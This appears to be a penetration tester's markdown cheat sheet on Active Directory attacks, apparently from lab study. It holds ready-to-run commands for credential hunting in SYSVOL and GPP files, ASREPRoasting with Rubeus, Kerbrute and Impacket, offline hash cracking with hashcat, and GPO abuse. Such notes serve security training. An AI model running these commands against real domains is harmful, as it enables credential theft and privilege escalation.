# Exchange Related Group Membership
```
An unmodified Microsoft Exchange installation in an AD environment exposes multiple attack vectors, as it is granted significant privileges. 
The "Exchange Windows Permissions" group can be exploited to grant DCSync privileges to a user. 
Also, the "Organization Management" group in Exchange has considerable power, acting like "Domain Admins" and accessing all domain user mailboxes.
```
# PrivExchange
```
The PrivExchange attack exploits a flaw in the Exchange Server PushSubscription feature, allowing any domain user with a mailbox 
to force the Exchange server to authenticate to any HTTP host. 
This over-privileged service can be abused to dump the domain NTDS database or gain access to other hosts within the domain, 
potentially leading to Domain Admin privileges with any authenticated domain user account.
```
# Printer Bug
```
The Printer Bug is a vulnerability in the MS-RPRN protocol, allowing any domain user to exploit it and gain access to a print server over SMB. 
It can be used to retrieve password hashes from AD and grant unauthorized privileges. 
The bug can also compromise a Domain Controller in a partner domain if specific conditions are met. 
Tools like Get-SpoolStatus can help identify vulnerable machines.
```
## Enumerating for MS-PRN Printer Bug
```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName PC'SNAME.MYDOMAIN.LOCAL
```
# MS14-068
```
(MAntis machine in htb https://app.hackthebox.com/machines/98)
The flaw in the Kerberos protocol allowed attackers to exploit standard domain user credentials to elevate privileges to Domain Admin.
Normally, a Kerberos ticket contains user information, including account details and group membership in the Privilege Attribute Certificate (PAC),
signed by the KDC for validation.
However, the vulnerability allowed a forged PAC to be accepted as legitimate, enabling the creation of a fake PAC to present a user as a
member of Domain Administrators or other privileged groups.
Exploitation can be done using tools like Python Kerberos Exploitation Kit (PyKEK) or the Impacket toolkit.
```
# Sniffing LDAP Credentials
```
Attackers can exploit weak or default passwords in web admin consoles of applications and printers to access stored LDAP credentials.
Sometimes, these credentials are even stored in cleartext.
The attacker can change the LDAP IP address to their own attack host and set up a netcat listener on LDAP port 389 to capture the credentials
when the application attempts to test the LDAP connection.
These credentials are often privileged, providing a foothold in the domain. In some cases, a full LDAP server may be needed for this attack.
```
# Enumerating DNS Records
## Using adidnsdump
```bash
# to enumerate all DNS records in a domain using a valid domain user account use : https://github.com/dirkjanm/adidnsdump
adidnsdump -u mydomain\\user ldap://192.168.0.1
# Use -r Option to Resolve Unknown Records
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
## Viewing the Contents of the records.csv File
```bash
head records.csv
```
# Hide password
## Finding Passwords in the Description Field using Get-Domain User
```powershell
Import-module .\powerview.ps1
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
## Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```bash
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
## Credentials in SMB Shares and SYSVOL Scripts
```
The SYSVOL share is a valuable source of data, especially in large organizations.
The scripts directory within SYSVOL often contains batch, VBScript, and PowerShell scripts accessible to all authenticated domain users.
Exploring this directory can lead to the discovery of passwords stored in scripts.
While some scripts may contain outdated or disabled account information, occasionally, we can find valuable information, making it essential to
always investigate this directory thoroughly.
```
## Group Policy Preferences (GPP) Passwords
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

    Map drives (drives.xml)
    Create local users
    Create printer config files (printers.xml)
    Creating and updating services (services.xml)
    Creating scheduled tasks (scheduledtasks.xml)
    Changing local admin passwords.

```bash
gpp-decrypt HashGPPpassword
```
### Locating & Retrieving GPP Passwords with CrackMapExec
```bash
crackmapexec smb -L | grep gpp
```
### Using CrackMapExec's gpp_autologin Module
```bash
crackmapexec smb 192.168.0.1 -u username -p Password -M gpp_autologin
```
# ASREPRoasting
```
It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled.
Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP)
is encrypted with the accountâ€™s password, and any domain user can request it.
ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP.
An SPN is not required. This setting can be enumerated with PowerView or other built-in tools.

The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account.
If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking
```
## Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
# You have to see 'DONT_REQ_PREAUTH'
```
This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. 

## Retrieving AS-REP in Proper Format using Rubeus
```powershell
.\Rubeus.exe asreproast /user:username /nowrap /format:hashcat
# add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.
```
 then crack the hash offline
```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt 
```
## Retrieving the AS-REP Using Kerbrute
```bash
#Kerbrut will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
kerbrute userenum -d mydomain.local --dc 192.168.0.1 /opt/jsmith.txt 
```
## Hunting for Users with Kerberoast Pre-auth Not Required
With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. 
```bash
GetNPUsers.py MYDOMAIN.LOCAL/ -dc-ip 192.168.0.1 -no-pass -usersfile valid_ad_users
```

# Group Policy Object (GPO) Abuse
GPO misconfigurations can be abused to perform the following attacks:
    Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
    Adding a local admin user to one or more hosts
    Creating an immediate scheduled task to perform any number of actions
## Enumerating GPO Names with PowerView
```powershell
Get-DomainGPO |select displayname
```
## Enumerating GPO Names with a Built-In Cmdlet
Only works if Group Policy Management Tools are installed.
```powershell
Get-GPO -All | Select DisplayName
```
## Enumerating Domain User GPO Rights
```powershell
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
## Converting GPO GUID to Name
see the display name of the GPO:
```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
to take advantage of this GPO misconfiguration : https://github.com/FSecureLABS/SharpGPOAbuse








 
